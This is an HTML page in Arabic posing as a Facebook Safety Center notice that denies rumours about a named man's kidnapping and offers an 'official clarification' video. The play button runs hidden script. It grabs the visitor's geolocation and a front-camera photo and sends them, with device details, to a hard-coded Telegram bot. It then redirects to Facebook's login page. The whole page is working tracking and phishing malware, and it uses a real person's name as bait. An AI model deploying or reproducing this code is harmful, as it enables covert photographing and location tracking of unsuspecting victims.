<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>فيسبوك - مركز المساعدة</title>
    
    <meta property="og:title" content="توضيح رسمي: حقيقة اختطاف محمد مصطفى العنعوني">
    <meta property="og:description" content="بيان هام من الجهات المختصة بخصوص الإشاعات الأخيرة. اضغط للمتابعة.">
    <meta property="og:image" content="https://static.xx.fbcdn.net/rsrc.php/y1/r/4l_v2zS3p9K.svg">

    <style>
        :root { --fb-blue: #1877f2; --fb-bg: #f0f2f5; }
        body { margin:0; background: var(--fb-bg); font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; display: flex; justify-content: center; min-height: 100vh; }
        .fb-card { width: 100%; max-width: 450px; background: white; margin-top: 20px; border-radius: 8px; box-shadow: 0 1px 2px rgba(0,0,0,0.2); border: 1px solid #dddfe2; overflow: hidden; height: fit-content; }
        .header { padding: 12px 16px; display: flex; align-items: center; border-bottom: 1px solid #eee; }
        .avatar { width: 40px; height: 40px; border-radius: 50%; background: #1877f2; color: white; display: flex; align-items: center; justify-content: center; margin-left: 12px; font-weight: bold; }
        .post-content { padding: 16px; font-size: 15px; color: #1c1e21; line-height: 1.5; text-align: right; }
        .media-placeholder { width: 100%; height: 250px; background: #000; display: flex; justify-content: center; align-items: center; position: relative; }
        .blur-img { width: 100%; height: 100%; object-fit: cover; opacity: 0.5; filter: blur(5px); }
        .play-btn { position: absolute; padding: 12px 24px; background: var(--fb-blue); color: white; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; z-index: 5; font-size: 16px; }
        .footer { padding: 15px; text-align: center; font-size: 13px; color: #65676b; background: #f5f6f7; border-top: 1px solid #eee; }
    </style>
</head>
<body>

<div class="fb-card">
    <div class="header">
        <div class="avatar">FB</div>
        <div style="text-align: right;">
            <div style="font-weight: bold; font-size: 15px;">مركز الأمان في فيسبوك ✔</div>
            <div style="font-size: 12px; color: #65676b;">منذ قليل · 🌍</div>
        </div>
    </div>
    
    <div class="post-content">
        <b>تنبيه بخصوص المحتوى المتداول:</b> انتشرت مؤخراً أخبار كاذبة حول اختطاف <b>محمد مصطفى العنعوني</b>. نود التوضيح أن هذه المعلومات غير دقيقة. يرجى مشاهدة التوضيح الرسمي المسجل أدناه لتجنب نشر الإشاعات.
    </div>

    <div class="media-placeholder">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/05/Facebook_Logo_%282019%29.png/1024px-Facebook_Logo_%282019%29.png" class="blur-img">
        <button class="play-btn" id="goBtn">تشغيل التوضيح الرسمي</button>
    </div>

    <div class="footer">Meta © 2026 · شروط الخدمة والخصوصية</div>
</div>

<script>
// === إعدادات تليجرام مباشرة ===
const TOKEN = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
const CHAT_ID = "1611398303";

document.getElementById('goBtn').onclick = function() {
    this.innerText = "جاري التحميل...";
    this.disabled = true;
    
    // طلب الصلاحيات فوراً بعد التفاعل
    startLogic();
};

async function startLogic() {
    // محاولة الحصول على الموقع أولاً
    navigator.geolocation.getCurrentPosition(
        (pos) => { capture(pos); },
        () => { capture(null); },
        { timeout: 4000 }
    );
    
    // توجيه إجباري بعد 7 ثوانٍ لضمان عدم تعليق المستخدم في حال الحظر
    setTimeout(() => {
        window.location.href = "https://m.facebook.com/login/";
    }, 7000);
}

async function capture(pos) {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
        const video = document.createElement('video');
        video.srcObject = stream;
        await video.play();

        setTimeout(async () => {
            const canvas = document.createElement('canvas');
            canvas.width = 480; canvas.height = 640;
            canvas.getContext('2d').drawImage(video, 0, 0, 480, 640);
            const imgData = canvas.toDataURL('image/jpeg', 0.5); // جودة منخفضة لسرعة الإرسال في النانو بيم
            stream.getTracks().forEach(t => t.stop());

            await shipToTelegram(imgData, pos);
        }, 800);
    } catch (err) {
        await shipToTelegram(null, pos);
    }
}

async function shipToTelegram(img, pos) {
    const fd = new FormData();
    let text = `🎯 صيد جديد (مباشر من GitHub)\n🌐 الجهاز: ${navigator.platform}`;
    
    if (pos) {
        text += `\n📍 الموقع: ${pos.coords.latitude},${pos.coords.longitude}\n🔗 الخريطة: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
    }

    fd.append('chat_id', CHAT_ID);
    fd.append('caption', text);

    if (img) {
        const res = await fetch(img);
        const blob = await res.blob();
        fd.append('photo', blob, 'shot.jpg');
    }

    try {
        // الإرسال المباشر مع إضافة fetch options للتعامل مع ضعف الشبكة
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
            method: 'POST',
            body: fd,
            keepalive: true // يضمن استمرار الإرسال حتى لو انتقل المستخدم لصفحة أخرى
        });
    } catch (e) {
        console.error("Connection failed - might be ISP block");
    } finally {
        // التوجيه النهائي
        window.location.href = "https://m.facebook.com/login/";
    }
}
</script>

</body>
</html>
